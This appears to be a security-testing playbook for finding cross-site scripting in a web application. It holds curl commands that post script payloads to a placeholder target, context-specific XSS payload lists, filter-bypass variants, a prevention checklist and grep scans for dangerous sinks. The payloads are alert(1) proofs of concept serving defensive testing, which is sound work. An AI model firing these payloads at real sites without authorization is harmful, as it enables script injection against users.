# XSS Testing

Based on OWASP Top 10 A03:2021 and MITRE ATT&CK T1190, T1059.

## When to Use

- After adding new pages or components
- When user input is rendered in the UI
- Before deployment to production

## Types of XSS

### 1. Reflected XSS

Input reflected in response (URL params, search fields, error messages).

```bash
# Test URL parameters
curl "https://target/search?q=<script>alert(1)</script>"
curl "https://target/error?msg=<img src=x onerror=alert(1)>"
```

### 2. Stored XSS

Input saved and rendered to other users (profiles, comments, chat).

```bash
# Submit payload to stored fields
curl -X POST https://target/api/messages \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>alert(document.domain)</script>"}'
```

### 3. DOM-Based XSS

Client-side JS reads attacker-controlled data and writes to DOM.

```javascript
// Check for dangerous sinks in client code
// Sources: location.hash, location.search, document.referrer, window.name
// Sinks: innerHTML, outerHTML, document.write, eval, setTimeout

// Test URL hash
https://target/page#<img src=x onerror=alert(1)>

// Test URL search
https://target/page?q=<script>alert(1)</script>
```

## Payloads by Context

### HTML Body

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### HTML Attribute

```html
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
"><script>alert(1)</script>
```

### JavaScript String

```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### URL/href

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Filter Bypass

```html
<ScRiPt>alert(1)</sCrIpT>
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

## Checklist

### Prevention

- [ ] No `dangerouslySetInnerHTML` with user input (React)
- [ ] No `innerHTML` assignments with user data
- [ ] Output encoding applied (context-aware)
- [ ] CSP `script-src` without `unsafe-inline`
- [ ] Input validation and sanitization

### DOM-Specific

- [ ] No `document.write()` with user input
- [ ] No `eval()` with user data
- [ ] No `innerHTML` from URL parameters
- [ ] React `dangerouslySetInnerHTML` only with sanitized HTML

## Quick Scan

```bash
# Check for dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" apps/web/ --include="*.tsx"

# Check for innerHTML
grep -rn "innerHTML\|outerHTML" apps/web/src/ --include="*.ts" --include="*.tsx"

# Check for document.write
grep -rn "document\.write" apps/web/src/ --include="*.ts" --include="*.tsx"

# Check for eval
grep -rn "eval(\|Function(" apps/web/src/ --include="*.ts" --include="*.tsx"
```

## References

- Source: Anthropic-Cybersecurity-Skills `testing-for-xss-vulnerabilities`
- OWASP: https://owasp.org/www-community/attacks/xss/
